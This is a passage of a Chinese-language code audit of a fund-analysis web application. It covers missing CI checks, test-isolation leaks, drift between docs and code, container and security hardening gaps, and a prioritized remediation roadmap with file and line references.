- 时间显示：`QualityConfig.tsx:170`（`updatedAt.slice(0,19)` → `2026-09-29T21:45:12`）、`SchedulePlan.tsx:167`、`SignalBacktest.tsx:396`（后端 `str()` 带微秒）都在直接渲染原始串，而 `utils/format.ts:28` 的 `formatBeijingTime` 只被 2 个文件使用。
- 可访问性：表格内 `Switch`/`Checkbox` 无 `aria-label`（`FactorManagement.tsx:286`、`PushConfig.tsx:150`、`SchedulePlan.tsx:168`、`ReportConfig.tsx:58`、`System.tsx:667`、`FundPool.tsx:293,514`）；`Dashboard.tsx:769` `showLabel={false}` 让买卖方向只靠颜色（Tooltip 需 hover，键盘不可达）。
- ECharts tooltip 用字符串拼 HTML（`SignalBacktest.tsx:189-195`、`FundDetailPanel.tsx:429`）→ 后端可控字符串进入 `innerHTML`；建议 `echarts.format.encodeHTML` 或 `renderMode:'richText'`。（`react-markdown` 未启用 `rehype-raw`，无 XSS 路径。）
- 死代码与类型逃生口：`store/index.ts:13,29,30` 的 `pageTitle`/`setSidebarOpen` 无人读、`hooks/useAIChat.ts` 无人 import、`api/fund.ts:56,62` 与 `api/analysis.ts:31` 无调用方、7 处 `as any`、`AiWorkbench.tsx:127` 双重断言掩盖 schema 不一致。
- **潜在构建断裂**：`tsconfig.json:24-27` 声明 `"@/*": ["src/*"]`，但 `vite.config.ts` 没有 `resolve.alias` → 第一个 `@/` 导入会通过 `tsc` 却在打包时失败（目前 0 处使用，属定时炸弹）。
- 无 ESLint（`frontend/package.json` 无 eslint 依赖/脚本），但代码里有 3 处 `// eslint-disable-next-line react-hooks/exhaustive-deps`（`Dashboard.tsx:171`、`FundDetailPage.tsx:120`、`System.tsx:243`）——无效指令，这也是上面若干 stale closure 类缺陷能进仓库的原因。

---

## 8. 工程量、测试与运维

### [P1] CI 不跑任何检查：唯一工作流只有 `uses:`，没有一行 `run:`

- 证据：`.github/workflows/docker-publish.yml` 全文 `grep -c "run:"` = **0**；两个 job 只调用 `docker/setup-buildx-action`/`login-action`/`metadata-action`/`build-push-action`；`grep "pytest|tsc|ruff|mypy|lint"` 无命中。
- 影响：把 448 个测试全改坏的 PR、引入类型错误的 PR 都会绿。当前"CI 是绿的"只说明它什么都没测；前端唯一的隐式门禁是 `frontend/Dockerfile:22` 的 `npm run build`（我本地跑 `tsc --noEmit` 通过，故镜像能构建）。
- 建议：加 `test` job（`pip install -r backend/requirements.txt && python -m pytest -q`）并让 `build-and-push-*` `needs:` 它；再加 `ruff`（或 flake8）+ `mypy` 与前端 `npm run lint`；`concurrency:` 取消过期运行；第三方 action 固定到 commit SHA（现在用的是可变 tag）。

### [P1] 后端与前端都没有任何静态检查配置

- 证据：仓库根目录没有 `pyproject.toml` / `setup.cfg` / `.flake8` / `.pre-commit-config.yaml`（`ls` 无命中）；`frontend/package.json` 无 eslint 依赖、无 `lint` 脚本，但代码里有 3 处 `// eslint-disable-next-line react-hooks/exhaustive-deps`（`Dashboard.tsx:171`、`FundDetailPage.tsx:120`、`System.tsx:243`）——无效指令。
- 建议：后端上 `ruff`（含 `flake8-bugbear`）+ `mypy --ignore-missing-imports` 起步（先只对 `engines/`、`utils/` 打开，避免 23k 行一次性爆炸）；前端补 ESLint 并把 `react-hooks/exhaustive-deps` 设为 error——§7 的几处 stale closure 缺陷正是这个规则能拦住的。

### [P2] 测试隔离有一个漏点：`AdviceLearningStore` 单例会打开生产库

- 证据：`tests/test_fund_tags.py:475` `store = mod.AdviceLearningStore.__new__(mod.AdviceLearningStore)`；而 `advice_learning_service.py:70-77` 的 `__new__` 是单例实现，首次调用即执行 `_init()` → `:83-91` 按 `settings.DATABASE_DIR/DATABASE_NAME` 打开真实库并 `executescript(_SCHEMA)`。`tests/conftest.py:37-65` 只重定向了 `error_log_service.DB_PATH`，没有重定向 `settings.DATABASE_DIR`。同文件 `:515-516` 的 `_cal_store` 注释已经写明"后者会先按 settings 打开 data/fund_quant.db 建表，测试不该碰真实库文件"，但另一处仍走了 `__new__`。
- **实测校正**：我核对了本机库，`advice_log`/`advice_outcomes`/`advice_calibration` 三表**存在但均为 0 行** —— 所以实际泄漏是"在生产库里建了 3 张空表 + 进程内单例被指向 pytest 的 tmp 库"，**没有发生测试数据污染**（这与 `error_logs` 那次（commit `0aa3e74`）的性质不同，严重度应从 P1 降到 P2）。
- 建议：conftest 增加 autouse fixture 把 `settings.DATABASE_DIR`/`DATABASE_NAME` 重定向到 `tmp_path` 并重置两个 `_instance`；`test_fund_tags.py:475` 改用 `object.__new__`；删掉 `:472` 的自赋值 monkeypatch（空操作）。

### [P2] 覆盖面的真实分布：单元数学扎实，集成与 UI 为零

- 已有（确实在断言真实行为）：`test_engines.py:356-412` 断言 `ScoringEngine.compute` 实际输出；`test_quality_filter.py` 621 行真实断言；`test_factor_fixes.py`、`test_backtest*.py`、`test_realtime.py`（40KB）同理。448 用例 23s 全绿，速度很好。
- 缺口（我独立核对成立）：**没有任何 API 层测试**（`grep -rln "TestClient\|ASGITransport" tests/` → 无命中，即从未通过 ASGI 发过一个请求）；**没有迁移测试**（`init_db` 与 `data_source_manager` 在 `tests/` 中出现 0 次）；**没有前端测试**（无 vitest/jest/@testing-library，16 个页面 0 覆盖）。
- 影响：风险最高的接缝恰好无覆盖——降级/恢复链（生产最依赖）、每次启动自动执行的迁移、HTTP 契约（校验/信封/错误映射/缺失的鉴权）、整个 UI。
- 建议优先级：① ASGI 冒烟套件（每路由 1 条正常 + 1 条校验失败，用 `httpx.AsyncClient(transport=ASGITransport(app))` + 临时 SQLite）；② 迁移测试（构造旧 schema 库，断言幂等与列存在）；③ `DataSourceManager` 降级/恢复测试（伪造 adapter）；④ 前端 Vitest 至少覆盖 API client 与 1 个页面。

### [P2] 文档与代码的事实漂移（会给接手者错误指引）

| 文档声明 | 代码事实 | 证据 |
|---|---|---|
| `README.md:17` "API 路由（15 个模块…）" | 实际挂载 **13** 个路由模块 | `backend/routers/__init__.py:21-34`（13 × `include_router`） |
| `README.md:308` "报告配置项（17 项：8 基金维度 + 9 市场维度）" | 总数 17 正确，但拆分错：代码分类是 5 基金 + 9 市场，种子是 5 + 12 | `engines/report_engine.py:3-19`；`database.py` `default_report_configs` |
| `ARCHITECTURE.md:160` "因子计算引擎（5 因子注册）"、`:676` "初始 5 因子" | 实际 **11** 因子（∑权重 8.3） | `database.py:59-213` `_build_factor_seeds`（11 项） |
| `ARCHITECTURE.md:676` "含 8 张表" | 实际 **17** 张表 | `grep -rn "__tablename__" backend/models/*.py` → 17 |
| `ARCHITECTURE.md:497` `GET /api/system/config` | 真实路径是 `/api/system`（无 `/config`） | `routers/__init__.py:31` + `routers/system_config.py:58` |
| `requirements.txt:18-20` 注释"调休同步的 SSRF 逐跳校验用到 2.31+ 的 resolution_callback" | `requests` **没有** `resolution_callback` 参数，该调用恒抛 `TypeError`（见 §5 的 P1「调休同步恒失败」） | 实测 `requests 2.32.5`：`TypeError: request() got an unexpected keyword argument 'resolution_callback'` |
| `README.md:410` 把 `run_batch_with_timeout()` 列为批处理能力 | 该函数无任何调用方，且自身不使用 `timeout` 参数 | `utils/concurrency.py:173,209` |

一致性确认（无漂移）：README 环境变量表与 `config.py`/`.env.example` 完全一致；"16 个管理页面"与 `frontend/src/pages/` 一致；"15 内置工具"与 15 个 `@tool` 一致；"38 个数值参数分 7 组"与 `QUALITY_CONFIG`/`PARAM_META` 一致。`ARCHITECTURE.md` 是 5-7 月的历史设计文档，建议在文件头加"已过期，以 README + 代码为准"的横幅，或删除其中已失效的端点/表结构章节——否则按它实现会对着不存在的 API 写代码。

---

### [P3] 稳定性隐患与运维缺口

- **脆弱测试**：`tests/test_error_log.py:56-60` 用 `while time.strftime("%H:%M:%S") == start_sec: sleep(0.05)` 忙等时钟秒边界；`tests/test_no_nav_skip.py:210-228` 用 50×0.02s 轮询取结果；`test_data_source_health.py:41,63-74,96-103` 手写保存/恢复模块级全局状态（断言失败即泄漏到后续用例）。conftest 只屏蔽了 3 个重量级调用（`:18-34`），其余测试各自 mock，漏 mock 就会真发网络请求。
- **无备份/无灾难恢复**：`grep -rlE "VACUUM INTO|\.backup\(|shutil.copy" backend/ scripts/ deploy.sh` → 无命中；唯一的"导出"是分析结果 JSON（`README.md:301`）。DB 是 `./data:/app/data` 普通 bind mount（`docker-compose.yml:36`），WAL 模式下运行中直接拷文件有得到不可恢复快照的风险。建议迁移前 `VACUUM INTO` 备份 + 保留 N 份 + 文档化恢复步骤。
- **容器与编排**：`backend/Dockerfile` 无 `USER`（以 root 运行）、单阶段且保留 `gcc/g++/libffi-dev`、基础镜像用浮动 tag 且 Python 3.9 已 EOL；`docker-compose*.yml` 中 `stop_grace_period|mem_limit|deploy:|resources:|security_opt|read_only` **命中 0 次**（无资源上限、无优雅停机时限）；`docker-compose.qnap.yml:61-62` 用裸 `depends_on` 而非 `condition: service_healthy`（prod 文件用的是后者）；`docker-compose.dev.yml:23,26,34` 的 `DEBUG=true` + 源码挂载 + `--reload` 若在 NAS 上误用，等于把 SQLAlchemy `echo`（会打印 bind 参数）和热重载暴露在 0.0.0.0:8000。
- **`DEBUG=true` 会把 AI Key 写进日志**：`database.py:17-21` `create_async_engine(..., echo=settings.DEBUG)`，而 Key 是作为 bind 参数写入的（`routers/system_config.py:84-99`），日志落 `data/logs/app.log`（`main.py:36-46`，保留 7 天）。这不是已有泄漏（当前 `ai_api_key` 为空），而是"排障时打开 DEBUG 就泄密"的陷阱。建议 `echo=False` 或 `hide_parameters=True`。
- **停机丢工作**：`main.py:157-174` 关闭时 `task_scheduler.shutdown(wait=False)`（`task_scheduler.py:54`）、`_AKSHARE_POOL.shutdown(wait=False, cancel_futures=True)`（`concurrency.py:218`），且 `_prewarm_task`/`_tag_heal_task` 从未 cancel/await（`main.py:136,151`）；compose 未设 `stop_grace_period`（默认 10s），全量分析跑到一半时 `up -d --build` 会打断写事务。建议 shutdown 时取消并 await 两个后台任务、给调度器与线程池有界等待、compose 设 `stop_grace_period: 60s`。
- **测试依赖进生产镜像**：`backend/requirements.txt:22-23` 的 `pytest`/`pytest-asyncio` 被 `backend/Dockerfile:47` 一起装进运行镜像。建议拆 `requirements-dev.txt`。

## 9. 优化路线图

按"风险 × 性价比"排序，分三批。每项都给了最小可落地做法，避免大重构。

### 第 0 批：两个 P0（建议先做，半天内可完成）

| # | 事项 | 最小做法 |
|---|---|---|
| 0a | 收回暴露面 | `docker-compose.yml:44-45` 改 `127.0.0.1:8000:8000`（或直接删掉 backend 的 `ports`，只留 nginx 入口）；生产设 `docs_url=None, redoc_url=None, openapi_url=None`；nginx 加 `auth_basic` 或前面挂反代鉴权 |
| 0b | 加一层令牌校验 | `backend/main.py:198` 改 `app.include_router(api_router, prefix="/api", dependencies=[Depends(require_api_token)])`，令牌从环境变量/HMAC 比较读取；换掉 `.env` 里那两个真实凭据（飞书 hook / TuShare token）并轮换 |
| 0c | 密钥不回显 | `routers/push_channel.py:31-45` 的 `token` 改为只写（返回 `has_token: bool`），webhook 打码；`schemas/push_channel.py:35-36` 同步 |
| 0d | `ai_base_url` 校验 | `routers/system_config.py:86-87` 复用 `connectivity_service._validate_public_url`，或白名单为 4 个预设值 |

### 第 1 批：把"纸面防线"变成真防线（建议本周内，合计约 1-2 天）

| # | 事项 | 涉及文件 | 最小做法 |
|---|---|---|---|
| 1 | AI token 预算真生效 | `llm/base.py:135-145`、`ai/agent_runner.py:204` | 请求加 `stream_options={"include_usage": True}`；去掉 `or 1`；补 1 个真实 usage 断言 |
| 2 | 每工具 + 整次运行超时 | `ai/agent_runner.py:213`、`ai_tools/registry.py:102` | `await asyncio.wait_for(execute_tool(...), 20)`；整轮/整次 wall-clock deadline |
| 3 | 预置任务参数钳位 | `routers/ai_agent.py:30`、`ai/presets.py:20-29` | 每个预设一个 Pydantic 参数模型，复用直连端点的 clamp（`ai_agent.py:97`） |
| 4 | `ai_base_url` 写入校验 | `routers/system_config.py:86` | 复用 `connectivity_service._validate_public_url`，或白名单为 4 个预设 |
| 5 | 密钥不回显 | `routers/push_channel.py:31-45`、`schemas/push_channel.py:35-36` | `token` 改为只写（返回 `has_token: bool`），webhook 打码 |
| 6 | SQLite 外键真的生效 | `database.py:17-26` | `@event.listens_for(engine.sync_engine, "connect")` 里 `PRAGMA foreign_keys=ON`；补一次孤儿清理迁移 |
| 7 | 迁移失败 fail-fast + 备份 | `database.py:223-229,331-342` | 仅吞"duplicate column/already exists"，其余 raise；迁移前 `VACUUM INTO` 备份 |
| 8 | `/health` 反映真实状态 | `main.py:202-204` | `SELECT 1` 探库 + 报告降级数据源，失败返 503；拆 live/ready |
| 9 | CI 加测试门禁 | `.github/workflows/docker-publish.yml` | 新增 `test` job 跑 `pytest -q`，`build-and-push-*` 加 `needs:` |

### 第 2 批：停止产出"看起来对"的错数据（建议 1-2 周）

| # | 事项 | 涉及文件 | 最小做法 |
|---|---|---|---|
| 10 | 场外净值复权口径 | `akshare_adapter.py:515-521,557` | 用已解析的 `日增长率`/`LJJZ` 重建复权序列；`FundData` 增 `nav_basis` 并透传；降级切换口径时打 warning + 埋点 |
| 11 | 部分失败不再当成功 | `akshare_adapter.py:452-481` | 返回/抛出 PartialData；质量过滤按"数据缺失"处理（否决或标记）而非中性化 |
| 12 | 区分"该基金无数据"与"源挂了" | `data_source_manager.py:157-161,171-191` | NoData 不计入降级；指数/国债路径改判 `src.active`；`mark_unavailable` 补 `degraded_at` |
| 13 | 估值/申购状态源加负缓存 | `index_valuation_service.py:90-99,192-201` | 加 `_FAIL_TTL` + `log_source_failure`；部分结果与旧缓存合并；刷新移入调度 |
| 14 | 基准缓存键含 period/symbol | `akshare_adapter.py:764-771,803-810` | 键改 `(symbol, period)`；或缓存全量按需切片 |
| 15 | 并发预算真的封顶 | `utils/concurrency.py:152-159` | 许可改为 executor future 完成时释放；按 host 计在飞请求 |
| 16 | 事件循环不再被 sqlite3 阻塞 | `routers/analysis.py:445,459`、`routers/system_config.py:364`、`ai_tools/data_tools.py:416` | 统一 `await asyncio.to_thread(...)`（同文件已有正确写法可抄） |
| 17 | 市场概况缓存不再被 None 毒化 | `routers/analysis.py:246-256,217-230` | 全 None 时跳过写缓存；读路径加 TTL（如 30min）；`clear_cache()` 同时清 `_fail_cache` |
| 18 | 刷新任务取消安全 + 锁不重跑网络 | `fund_refresh_task.py:93-94,151-176` | `try/finally` 复位 `running`；取数一次入内存、只重试写库 |
| 19 | 前端参数保存校验 | `QualityConfig.tsx:128-131` | `!Number.isFinite` 即拒绝保存并提示；按元数据钳位 |
| 20 | 前端两处真 bug | `ReviewPage.tsx:71-77`、`SignalBacktest.tsx:116-131`、`AiWorkbench.tsx` 加卸载 abort | 见 §7 的 P1 三条 |
| 21 | 调休同步修好 | `holiday_sync_service.py:104-108` | 去掉不存在的 `resolution_callback`；用 `httpx` + 自定义 transport 做逐跳校验；同步 `requirements.txt` 的假注释 |
| 22 | "数据不足"能传出去 | `analysis_service.py:566-574`、`schemas/analysis.py:10-15`、`push_service.py:296-306` | `factor_scores` JSON 增 `data_valid`；Schema 加字段；推送重建时带上；按有效权重归一 `raw_score` |
| 23 | 修好估值分位（否则 0.8 权重因子永久中性） | `market_regime_service.py:184-188`、`akshare_adapter.py:707,741` | 门槛与数据源能力对齐或换源；取行前按日期排序；`市盈率2` 不再写进 `pb` |
| 24 | 回测口径：现金基线与样本量 | `backtest_service.py:176,289,326-334` | 补"静态 50% 仓位"与"买入持有"基线；`signal_days/total_days` 过低时返回 caveat；现金计短端利率 |
| 25 | 建议自进化改用超额收益 | `advice_learning_service.py:123-126`、`routers/analysis.py:463-471` | `hit = (fund - bench) > 0`；评估点固定为 `ts + 30 交易日`；同口径样本足够才校准 |
| 26 | 亏损基金年化收益 | `fund_compare_service.py:39-40` | 删掉 `total <= 0` 分支（1 行）+ 补负收益测试 |
| 27 | 净值新鲜度门槛 | `analysis_service.py:45-55` | 最新净值日期早于 N 个交易日 → 否决或硬标记；结果带 as-of 日期 |
| 28 | 棺材钉恢复窗口 | `quality_filter.py:227-235` | `if recovery_start + recovery_days > n: continue` |
| 29 | 调仓权重用市值 | `ai/rebalance.py:200` | `shares × 最新净值`；缺失时显式等权 + caveat，去掉 `1.0` 哨兵 |
| 30 | 市场概况缓存与阶段涨幅缓存 | `routers/analysis.py:217-256`、`fund_cache_service.py:88-118` | 全 None 不写缓存 + 读路径 TTL + `clear_cache()` 清 `_fail_cache`；阶段涨幅按 code 合并（新值为空保留旧值） |
| 31 | 动量族去冗余 | `factor_engine.py:615,643` + 因子权重 | 去掉或正交化 `momentum_accel`/`trend_consistency`；给同源因子簇设权重上限 |
| 32 | 市场因子与阈值去重复计 | `factor_engine.py:692`、`quality_filter.py:62,725-736` | 市场分量只进阈值（现有调节）或只进分数，二者取一 |

### 第 3 批：结构收敛与体验（可排期，1 个月量级，按需取）

- **认证与最小暴露面**：`api_router` 挂一个 bearer/HTTP-Basic 依赖；`ports: ["127.0.0.1:8000:8000"]`（或删掉 backend 的 ports 映射，只留 nginx）；生产 `docs_url=None`；nginx 补 `server_tokens off` + `X-Content-Type-Options`/`X-Frame-Options`/`Referrer-Policy`/CSP。
- **拆分巨石**：`database.py`（迁移 → Alembic）、`quality_filter.py`（参数表/形态/修正/决策分文件）、`fund_realtime_service.py`（源解析与估值模型分离）、`akshare_adapter.py`（解析下沉 `data_sources/parsers/`）。
- **服务层归位**：把 `routers/fund.py:516-553` 的原始 SQL、`:482-605` 的手工 session、`routers/analysis.py:232-326` 三份重复的市场概况组装、`push_service.py:163-235` 的第四份，收敛成 `MarketService.fetch_summary_snapshot()` 与 `HoldingService.overlap()`；`AnalysisResultOut` 的两份映射（`routers/analysis.py:77-120` vs `analysis_service.py:621-647`）合一。
- **N+1**：`GET /api/funds/change-summary` 目前约 6 查询/基金（57 只 ≈ 340 次往返），改为 3 次批量查询后在 Python 里 diff。
- **前端性能**：ECharts 改 `echarts/core` 按需引入（预计省 50-70% 首屏）；`FundPool` 行组件 `React.memo`；抽 `useAsyncData` + 基金列表缓存；`ReportConfig` 失败回滚 + 保存串行化。
- **文档**：README 的三处计数、`ARCHITECTURE.md` 加过期横幅；`requirements.txt` 的 `resolution_callback` 注释删掉。
- **平台**：Python 3.9 → 3.12（同时清理所有为 3.9 写的 lazy-lock 特例）；多阶段镜像 + 非 root + 固定 digest；compose 加资源上限/`stop_grace_period`/健康检查条件。
- **Android 客户端**（3811 行 Kotlin / 27 文件，README 仅一行提及，CI 不构建）：其 `Fund` 模型已缺 `fund_type_official`/`benchmark_text`/`exposure_tags`/`starred` 四个后端字段（对照 `schemas/fund.py:26-39`），即**契约漂移已经发生**。建议二选一：把它纳入 CI 构建 + 与后端 schema 做契约测试，或明确宣布冻结/归档，避免长期"三客户端半维护"。

---

## 10. 建议保留的设计（不要在这次优化里改掉）

这些是项目真正的资产，重构时容易被误伤：

1. **不限连重试**：`akshare_adapter._is_rate_limited` 命中限流标记即放弃重试（`akshare_adapter.py:213`），配合 `market_service` 的 120s 失败冷却——这是防封禁的核心纪律，改造重试逻辑时必须保留。
2. **预热先行、调度器后至**：`main.py:138-147` 用 45s `asyncio.shield` 预算避免预热与 APScheduler 补跑同时打行情源，注释把 healthcheck 余量都算过了。
3. **计划级当日熔断**：`task_scheduler.py:130-158`（同计划当日失败 3 次即停，跨日清零），有效阻止小时级 cron 在风控期一天补跑十几轮。
4. **任务内会话边界**：交易日闸门/分析/推送各用独立 DB 会话（`task_scheduler.py:94` 注释），避免中途 rollback 吞掉前一步落库。
5. **时区纪律**：全项目时间戳统一走 `utils/timezone.py`（`now_beijing`/`beijing_today`），我用 `grep "datetime.now()|date.today()|utcnow()"` 全量核对，**生产代码零违规**（仅注释提及）；调度与 cron 全部显式 `timezone="Asia/Shanghai"`。
6. **幂等索引与顺序锁**：`uq_fund_date` 唯一索引 + `_batch_load_quarterly_data` 批量化 + 分析进程锁（`analysis_service.py:99-104`）+ 调度取锁 900s 超时（`task_scheduler.py:195-218`）。
7. **前端已就位的好实践**：路由级 `lazy` + `manualChunks`（`App.tsx:53-61`、`vite.config.ts:15-19`）；`react-markdown` 不开 `rehype-raw`（无 XSS 路径）；`FundDetailPanel.tsx:237-264` 用单个 AbortController 管 34 个请求并带 `aborted` 守卫——这是全项目最规范的取数写法，应作为 `useAsyncData` 的模板。
8. **诚实的代码注释**：多处注释记录了"哪个坑、哪次修复、为什么不能这样改"（如 `quality_filter.py:61-72`、`akshare_adapter.py:96-98`、`concurrency.py:1-28`）。这是本项目最强的可维护性资产，重构时请把这些注释一起搬走，不要当噪音删掉。

---

## 附：本次审查的方法与局限

- 代码层面为全量阅读 + AST 依赖图 + 只读运行库查询 + 全量测试与类型检查实跑；每条结论都带 `文件:行号`。
- 抽样复核：对 6 份专项审计中被标为 P0/P1 的结论逐条回到源码核对，**并更正了其中 3 条的严重度**（测试污染生产库 → 实为建空表无行污染，P1→P2；`uq_fund_date` 检测误判 → 影响仅为一次幂等去重 DELETE，降至 P3；`data_fields` 缺失 → 引擎不消费该字段，P2→P3）。凡我未能独立复现的项，均在文中标注为需要进一步确认。
- 局限：未做运行时压测/长稳测试；未在真实 QNAP 容器里跑端到端；AI 相关结论基于 OpenAI 兼容协议的既定行为（`stream_options` 语义），未对真实 DeepSeek/GLM 端点发请求验证；Android 客户端仅做契约抽样，未逐页审查。

